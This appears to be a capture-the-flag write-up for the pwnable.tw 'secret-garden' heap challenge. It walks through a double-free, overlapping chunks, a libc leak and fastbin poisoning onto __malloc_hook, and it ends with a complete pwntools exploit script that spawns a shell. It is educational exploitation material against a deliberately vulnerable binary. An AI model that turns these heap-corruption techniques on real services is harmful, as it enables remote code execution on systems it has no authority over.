# pwnable.tw - secret-garden

Original challenge link: https://pwnable.tw/challenge/#12

##  Overview

It maintains a 100 pointer array in bss. It first mallocs a 40 byte metadata store chunk, which contains if the flower name is present or freed, colour, and pointer to flower name. Flower name chunk is malloc'd based on size we tell it. But when flower is removed, only the name chunk is freed. We can't print the flower content once freed, but we can call remove again to cause a double free.

## Goal

The first goal is to leak libc base. Since the libc version is old, we can easily overwrite __free_hook to get shell. Fastbin chunks can leak heap base, but we need to use unsortedbin chunks to leak a libc address. 

For reference, here are the helper stubs i used - 
```py
def create(size, name=b"x", color=b"y"):
    p.sendlineafter(b"Your choice : ", b"1")
    p.sendlineafter(b"name :", str(size).encode())
    p.sendafter(b"name of flower :", name)
    p.sendlineafter(b"color of the flower :", color)

def clean():
    p.sendlineafter(b"Your choice : ", b"4")

def visit():
    p.sendlineafter(b"Your choice : ", b"2")

def remove(idx):
    p.sendlineafter(b"Your choice : ", b"3")
    p.sendlineafter(b"remove from the garden:", str(idx).encode())
```

## Exploit
The issue is that visit doesn't print chunk's contents if the chunk is freed. So what we do is we delete that flower and create a new flower that will overlap the freed chunk and print its contents then.

```py
create(0xc0)
create(0xc0)
remove(0)
```
Why are we deleting 0 first? because otherwise, if we call free on last 0xc0 size chunk, it will just get merged with top chunk instead of going into unsortedbin.

So now if we malloc(0xc0), we will get a chunk with libc address, but wait, first it malloc's 40 bytes to store metadata. so what we do is, we call clean() first, which also deletes the metadata of flower 0. So now when we create a chunk, it will totally overlap it. 

So we do this to leak libc - 
```py
clean()
create(0xc0, b"0000000#")
visit()
p.recvuntil(b"#")
libc.address = u64(bytes.ljust(p.recv(6), 8, b"\0")) - 3947384
log.info(f"libc base - {hex(libc.address)}")
```


Now we need an overwrite primitive. To do that, we refocus on chunk merging and how fastbin chunks are singly linked list with pointer to next free chunk. 

(Note: I am explaining assuming the heap is clean, we need to adjust the offsets a bit because of fragmentation of heap during previous leak.)
First we create two consecutive unsorted bin chunks. To do that, we do - 
```py
create(0xe0) #A - Flower 0
create(0xc0) #B - Flower 1
remove(0)    
create(0xc0) #C  - Flower 2
remove(1)
remove(2)
```

Now what happens is, since A goes into unsorted bin, C's metadata gets allocated there, and C itself will be allocated right next to B. Then we free both B and C. Keep in mind that after removing them, flower 1 and flower 2 index still point at B and C. But B and C will be consolidated.

Now we issue a chunk of size 0xc0*2, its metadata again going into #A, but the name being allocated at B. So now we can totally overwrite #C region including the preceding metadata bytes. We create a fake 0x40 size chunk at #C. 
For that, we free the big 0xc0*2 size chunk again (there were some sanity checks issues, so we create a random flower before freeing this.) 
```py
create(0xc0*2, flat(
    b"A"*0xc0, ## filler to reach #C metadata
    0x0, #padding
    0x40, #chunk size
    b"a"*0x30,#junk content
    0x0, #padding
    0x20 #next chunk size
))
create(0xc0)
remove(2) # free our faake chunk
remove(3) # free our outer chunk
```

But the issue now is, when we call free/remove on Flower 2, it will free our fake chunk, But it won't poison the linked list yet. To poison it, we have to now overwrite our fake pointer at our fake chunk now.

To do that, we just create 0xc0*2 size chunk again, giving use write at #B - 
```py
create(0xc0*2, flat(
    b"A"*0xc0,
    0x0,
    0x20,
    0x1337  #overwrite at *next of fastbin chunk
))
```

Now fastbin chunk looks like #C -> 0x1337. And when malloc is called for 0x40 bytes it will get allotted #C, and 0x1337 will be allotted to next malloc call.

Now we face another hurdle, the fastbin allocation is a bit different compared to tcache. Fast bin actually checks if the chunk being allocated is actually of the size of the bin its being allocated from. Say if its being allocated from 0x20 bin chunk, u64(target+8) has to be a valid integer < 0x90. Free hook and a large chunk before it was completely null, so its out of possibility.

Now if you go and see the memory behind malloc_hook, there are some IO related addresses, generally starting from 0x7....... So we use the offset malloc_hook-0x23, which resulted in size being read from malloc_hook-0x1b, which what all blank, except 1 byte of the pointer 0x7?. It can be anything from 0x70 to 0x7f, since the mod 16 value seems to be only treated as some flags.

Finally The question arises what to overwrite with, which I failed to solve myself, and had to look at other writeups :(. No one_gadget condition was being fulfilled on malloc call. One interesting solve is that when a program causes double free or similar malloc memory corruption errors, it results in an error being printed out and backtrace being generated (old libc behaviour, it shouldn't work beyond glibc 2.26, you can check our script fails if you add MALLOC_CHECK_=2 in env.). And when this call is executed, one_gadget condition is met during malloc, so we can get our shell.


## Solve Script
```py
from pwn import *
import time
exe = ELF("./secretgarden_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl.exe', '-d', 'kali-linux']

gdbscript = """c
"""
def conn():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10203)
    #env = {"LD_PRELOAD": libc.path}
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r, gdbscript=gdbscript)
        time.sleep(2)
    return r

p = conn()

def create(size, name=b"x", color=b"y"):
    p.sendlineafter(b"Your choice : ", b"1")
    p.sendlineafter(b"name :", str(size).encode())
    p.sendafter(b"name of flower :", name)
    p.sendlineafter(b"color of the flower :", color)

def clean():
    p.sendlineafter(b"Your choice : ", b"4")

def visit():
    p.sendlineafter(b"Your choice : ", b"2")

def remove(idx):
    p.sendlineafter(b"Your choice : ", b"3")
    p.sendlineafter(b"remove from the garden:", str(idx).encode())


create(0xc0)
create(0xc0)
remove(0)
clean()
create(0xc0, b"0000000#")
visit()
p.recvuntil(b"#")
libc.address = u64(bytes.ljust(p.recv(6), 8, b"\0")) - 3947384
log.info(f"libc base - {hex(libc.address)}")
remove(0)
remove(1)
create(0x90) ## just to clear chunk in smallbin.


### overwrite
create(0xe0) #flower 3
create(0xc0) #flower 4
remove(3)
create(0xc0) #flower 5
remove(4)
remove(5)

create(0xc0*2, flat(
    b"A"*0xc0,
    0x0,
    0x70,
    b"a"*0x60,
    0x0,
    0x20
)) #flower 6

create(0xc0) #f7
remove(5)
remove(6)

create(0xc0*2, flat(
    b"A"*0xc0,
    0x0,
    0x70,
    libc.sym["__malloc_hook"]-0x23
))#f8

create(0x60) #f9

create(0x60, b"a"*0x13+p64(libc.address+0xef6c4)) #f10
remove(10)

p.interactive()

```